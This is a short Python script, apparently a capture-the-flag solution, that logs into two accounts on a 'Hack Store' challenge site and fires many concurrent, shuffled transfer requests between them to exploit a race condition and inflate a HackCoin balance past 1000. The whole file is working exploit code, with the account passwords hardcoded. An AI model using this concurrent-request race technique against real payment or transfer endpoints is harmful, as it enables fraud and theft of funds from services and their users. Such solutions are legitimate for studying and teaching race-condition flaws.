import itertools
import random
import re
import grequests
import requests

GITHUB = 'test1294'
ACCOUNTS = {
    'marty_mcfly': 'LOkx2hSIzA',
    'biff_tannen': 'CrR248YXUU',
}
TIMES = 20

BASE_URL = 'https://store.delorean.codes/u/' + GITHUB
LOGIN_URL = BASE_URL + '/login'
TRANSFER_URL = BASE_URL + '/transfer'


def other(username):
    for other in ACCOUNTS.keys():
        if other != username:
            return other

def print_response(response):
    try:
        text = response.text
        name = re.search(r'Welcome to the Hack Store, (.+)!', text).group(1)
        balance = re.search(r'Your account balance (.+) HackCoins.',
                            text).group(1)
        print('{:<10} {:>6}'.format(name, balance))
        if int(balance) >= 1000:
            print(text)
    except Exception as e:
        print(response)
        print(response.text)
        raise e

def shuffle(items):
    items = list(items)
    random.shuffle(items)
    return items

def main():
    sessions = {}
    for username, password in ACCOUNTS.items():
        session = requests.Session()
        response = session.post(LOGIN_URL, data={
            'username': username,
            'password': password,
        })
        print_response(response)
        sessions[username] = session

    responses = grequests.map(shuffle(list(itertools.chain(*zip(*[
        [
            grequests.post(TRANSFER_URL, session=session, data={
                'to': other(username),
            })
            for i in range(TIMES)
        ]
        for username, session in sessions.items()
    ]))) + [
        grequests.post(LOGIN_URL, session=session, data={
            'username': username,
            'password': password,
        })
        for username, password in ACCOUNTS.items()
    ]))
    print()
    for response in responses:
        print_response(response)

    print()
    for username, session in sessions.items():
        response = session.get(BASE_URL)
        print_response(response)


if __name__ == '__main__':
    main()
